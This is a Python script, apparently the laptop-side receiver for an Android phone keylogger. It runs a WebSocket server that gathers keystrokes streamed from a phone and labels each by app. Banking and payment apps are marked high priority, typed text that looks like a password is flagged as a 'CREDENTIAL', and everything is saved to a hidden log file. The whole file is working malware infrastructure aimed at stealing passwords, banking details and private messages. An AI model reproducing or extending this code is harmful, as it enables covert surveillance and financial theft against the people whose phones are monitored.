#!/usr/bin/env python3
"""
receiver/receiver.py — Phone Keylogger Receiver
=================================================
Runs on your laptop. Listens for WebSocket connections from the
Android app. Displays live keystroke feed tagged by app, exactly
like stage4_viewer.py but for your phone.

Usage:
  pip install websockets --break-system-packages
  python3 receiver/receiver.py

Then connect the Android app to ws://192.168.179.7:9999
"""

import asyncio
import websockets
import json
import os
from datetime import datetime
from pathlib import Path

HOST     = "0.0.0.0"       # listen on all interfaces
PORT     = 9999
LOG_FILE = Path.home() / ".local" / "share" / ".phonelog"

RED     = "\033[91m"
YELLOW  = "\033[93m"
GREEN   = "\033[92m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BLUE    = "\033[94m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

# ── App package → friendly name + category ───────────────────────────────────
APP_MAP = {
    "com.whatsapp":                        ("WhatsApp",       "💬 Messaging"),
    "com.whatsapp.w4b":                    ("WhatsApp Biz",   "💬 Messaging"),
    "org.telegram.messenger":              ("Telegram",       "💬 Messaging"),
    "com.instagram.android":               ("Instagram",      "📸 Social"),
    "com.twitter.android":                 ("Twitter/X",      "📸 Social"),
    "com.facebook.katana":                 ("Facebook",       "📸 Social"),
    "com.snapchat.android":                ("Snapchat",       "📸 Social"),
    "com.google.android.gm":               ("Gmail",          "📧 Email"),
    "com.microsoft.office.outlook":        ("Outlook",        "📧 Email"),
    "com.android.chrome":                  ("Chrome",         "🌐 Browser"),
    "org.mozilla.firefox":                 ("Firefox",        "🌐 Browser"),
    "com.brave.browser":                   ("Brave",          "🌐 Browser"),
    "com.google.android.googlequicksearchbox": ("Google Search", "🔍 Search"),
    "com.google.android.apps.maps":        ("Google Maps",    "🗺 Maps"),
    "com.android.settings":                ("Settings",       "⚙ System"),
    "com.android.contacts":                ("Contacts",       "👤 System"),
    "com.google.android.dialer":           ("Phone",          "📞 System"),
    # Banking — high priority flag
    "com.hdfc.bank":                       ("HDFC Bank",      "🏦 BANKING"),
    "com.sbi.SBIFreedomPlus":             ("SBI",            "🏦 BANKING"),
    "com.axis.mobile":                     ("Axis Bank",      "🏦 BANKING"),
    "com.csam.icici.bank.imobile":         ("ICICI Bank",     "🏦 BANKING"),
    "com.phonepe.app":                     ("PhonePe",        "💳 PAYMENT"),
    "net.one97.paytm":                     ("Paytm",          "💳 PAYMENT"),
    "com.google.android.apps.nbu.paisa.user": ("GPay",        "💳 PAYMENT"),
    "com.amazon.mShop.android.shopping":   ("Amazon",         "🛒 Shopping"),
    "in.amazon.mShop.android.shopping":    ("Amazon IN",      "🛒 Shopping"),
}

HIGH_PRIORITY_CATEGORIES = {"🏦 BANKING", "💳 PAYMENT"}

BANNER = f"""
{RED}{BOLD}
██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗
██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝
██████╔╝███████║██║   ██║██╔██╗ ██║█████╗
██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝
██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
{RESET}{RED}██╗      ██╗███████╗████████╗███████╗███╗   ██╗███████╗██████╗
{RED}██║      ██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔══██╗
{RED}██║      ██║███████╗   ██║   █████╗  ██╔██╗ ██║█████╗  ██████╔╝
{RED}██║      ██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗
{RED}███████╗ ██║███████║   ██║   ███████╗██║ ╚████║███████╗██║  ██║
{RED}╚══════╝ ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{RESET}
{DIM}  VERSION 2 — Android Phone Keylogger Receiver{RESET}
{DIM}  Listening on ws://0.0.0.0:{PORT}{RESET}
{RED}  ──────────────────────────────────────────────────────────{RESET}
  Connect Android app to: {BOLD}ws://192.168.179.7:{PORT}{RESET}
{RED}  ──────────────────────────────────────────────────────────{RESET}
"""


def resolve_app(package):
    """Return friendly name and category for a package name."""
    if package in APP_MAP:
        name, category = APP_MAP[package]
        return name, category
    # Try to make unknown packages readable
    parts = package.split(".")
    name = parts[-1].replace("_", " ").title() if parts else package
    return name, "📱 App"


def password_score(text):
    if len(text) < 6:
        return 0
    score = 0
    if any(c.isupper() for c in text): score += 20
    if any(c.islower() for c in text): score += 20
    if any(c.isdigit() for c in text): score += 20
    if any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?" for c in text): score += 30
    if len(text) >= 8: score += 10
    return score


def write_log(package, app_name, category, text):
    try:
        LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        score = password_score(text)
        line  = f"{ts}|{package}|{app_name}|{category}|{text}|{score}\n"
        with open(LOG_FILE, "a") as f:
            f.write(line)
    except Exception:
        pass


def render_event(data):
    """Render a single event from the phone."""
    package  = data.get("package", "unknown")
    text     = data.get("text", "")
    event    = data.get("event", "text_changed")
    ts       = datetime.now().strftime("%H:%M:%S")

    app_name, category = resolve_app(package)
    score    = password_score(text)
    is_high  = category in HIGH_PRIORITY_CATEGORIES

    # Color coding
    if is_high:
        app_color = f"{RED}{BOLD}"
        box_char  = "╔═"
        box_color = RED
    elif score >= 80:
        app_color = f"{YELLOW}{BOLD}"
        box_char  = "╔═"
        box_color = YELLOW
    else:
        app_color = f"{CYAN}{BOLD}"
        box_char  = "┌─"
        box_color = DIM

    print(f"\n  {box_color}{box_char}{'═' if is_high or score >= 80 else '─'} {app_color}{category}  {app_name}{RESET}  {DIM}[{ts}]{RESET}")
    print(f"  {box_color}║{RESET}  {DIM}pkg  :{RESET}  {DIM}{package}{RESET}")
    print(f"  {box_color}║{RESET}  {DIM}text :{RESET}  {BOLD}{YELLOW}{text}{RESET}")

    if score >= 80:
        print(f"  {box_color}║{RESET}  {RED}{BOLD}⚠ CREDENTIAL — score {score}/100{RESET}")
    elif score >= 50:
        print(f"  {box_color}║{RESET}  {YELLOW}~ possible password — score {score}/100{RESET}")

    if is_high:
        print(f"  {box_color}║{RESET}  {RED}{BOLD}🏦 HIGH PRIORITY — financial app{RESET}")

    print(f"  {box_color}{'╚' if is_high or score >= 80 else '└'}{'═' * 55}{RESET}")

    # Write to log
    write_log(package, app_name, category, text)


async def handle_client(websocket):
    """Handle a connected Android device."""
    addr = websocket.remote_address
    print(f"\n  {GREEN}{BOLD}[+] Phone connected:{RESET} {addr[0]}:{addr[1]}")
    print(f"  {DIM}Waiting for keystrokes...{RESET}\n")

    try:
        async for message in websocket:
            try:
                data = json.loads(message)
                render_event(data)
            except json.JSONDecodeError:
                # Plain text fallback
                render_event({"package": "unknown", "text": message})
    except websockets.exceptions.ConnectionClosed:
        print(f"\n  {YELLOW}[-] Phone disconnected: {addr[0]}{RESET}")


async def main():
    print(BANNER)
    print(f"  {GREEN}Starting WebSocket server on port {PORT}...{RESET}")
    print(f"  {DIM}Log file: {LOG_FILE}{RESET}\n")
    print(f"{RED}  ── LIVE FEED ──────────────────────────────────────────────{RESET}\n")
    print(f"  {DIM}Waiting for Android app to connect...{RESET}")

    async with websockets.serve(handle_client, HOST, PORT):
        await asyncio.Future()  # run forever


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Receiver stopped.{RESET}\n")
